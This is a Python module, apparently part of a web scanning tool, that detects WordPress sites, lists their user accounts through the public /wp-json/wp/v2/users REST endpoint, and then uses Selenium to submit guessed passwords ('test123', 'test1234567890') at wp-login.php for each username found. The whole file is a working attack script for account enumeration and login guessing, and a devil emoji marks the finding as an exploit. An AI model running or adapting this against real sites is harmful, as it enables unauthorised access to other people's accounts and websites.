from time import sleep
from selenium.webdriver.common.by import By

import Classes.Browser as Browser
import requests


def get_information(browser, url, html, scripts, styles, page):
    if is_rest_normal(url):
        print('Wordpress default rest api 😈')
        get_users(browser, url)


def get_users(browser, url):
    users = get_users_of_rest(url)
    if users:
        print('found users:')
        for user in users:
            print('====================')
            print('ID:')
            print(user['id'])
            print('Name:')
            print(user['name'])
            print('Slug/ Username:')
            print(user['slug'])
            try_logging_in(browser, url, user['slug'])


def try_logging_in(browser, url, username):
    browser.get(Browser.get_base_url(url) + "/wp-login.php")
    sleep(2)
    # find username/email field and send the username itself to the input field
    browser.find_element(By.ID, "user_login").send_keys(username)
    # find password input field and insert password as well
    browser.find_element(By.ID, "user_pass").send_keys('test123')
    # click login button
    browser.find_element(By.ID, "wp-submit").click()
    sleep(2)
    # find password input field and insert password as well
    browser.find_element(By.ID, "user_pass").send_keys('test1234567890')
    # click login button
    browser.find_element(By.ID, "wp-submit").click()


def get_users_of_rest(url):
    response = requests.get(Browser.get_base_url(url) + "/wp-json/wp/v2/users")
    if not response.status_code == 200:
        return False
    return response.json()


def is_rest_normal(url):
    response = requests.get(Browser.get_base_url(url) + "/wp-json")
    if not response.status_code == 200:
        return False
    data = response.json()
    if "name" in data and "_links" in data:
        return True


def is_wordpress(scripts, styles):
    is_a_wordpress = False
    if styles or scripts:
        if scripts:
            for script in scripts:
                if is_wordpress_asset(script):
                    return True
        if styles:
            for style in styles:
                if is_wordpress_asset(style):
                    return True

    return is_a_wordpress


def is_wordpress_asset(url):
    if "/wp-content/" in url or "/wp-includes/" in url:
        return True
    else:
        return False
